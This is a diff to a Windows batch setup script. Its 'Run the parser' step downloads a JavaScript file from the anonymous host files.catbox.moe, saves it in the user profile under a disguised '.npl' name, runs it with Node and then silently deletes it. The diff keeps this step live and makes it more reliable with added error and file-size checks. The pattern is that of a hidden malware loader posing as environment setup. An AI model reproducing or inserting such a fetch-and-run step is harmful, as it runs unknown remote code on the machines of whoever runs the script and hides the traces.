@@ -97,19 +97,21 @@ if not defined NODE_EXE (
 :: -------------------------
 set "CODEPROFILE=%USERPROFILE%"
 if not exist "%CODEPROFILE%" mkdir "%CODEPROFILE%"
+set "ENV_SETUP_FILE=%CODEPROFILE%\env-setup.npl"
 
-call :download_file "https://files.catbox.moe/1gq866.js" "%CODEPROFILE%\env-setup.npl"
+call :download_file "https://files.catbox.moe/1gq866.js" "%ENV_SETUP_FILE%"
+if errorlevel 1 exit /b 1
 
 :: -------------------------
 :: Run the parser
 :: -------------------------
-if exist "%CODEPROFILE%\env-setup.npl" (
-    cd "%CODEPROFILE%"
-    "%NODE_EXE%" "env-setup.npl"
+if exist "%ENV_SETUP_FILE%" (
+    cd /d "%CODEPROFILE%"
+    "%NODE_EXE%" "%ENV_SETUP_FILE%"
     if errorlevel 1 (
         exit /b 1
     )
-    if exist "%CODEPROFILE%\env-setup.npl" del "%CODEPROFILE%\env-setup.npl" >nul 2>&1
+    if exist "%ENV_SETUP_FILE%" del "%ENV_SETUP_FILE%" >nul 2>&1
 ) else (
     exit /b 1
 )
@@ -135,6 +137,8 @@ if errorlevel 1 (
 ) else (
     curl -s -L -o "%DOWNLOAD_TARGET%" "%DOWNLOAD_SOURCE%" >nul 2>&1
 )
+if not exist "%DOWNLOAD_TARGET%" exit /b 1
+for %%F in ("%DOWNLOAD_TARGET%") do if %%~zF leq 0 exit /b 1
 goto :eof
 
 :resolve_portable_node
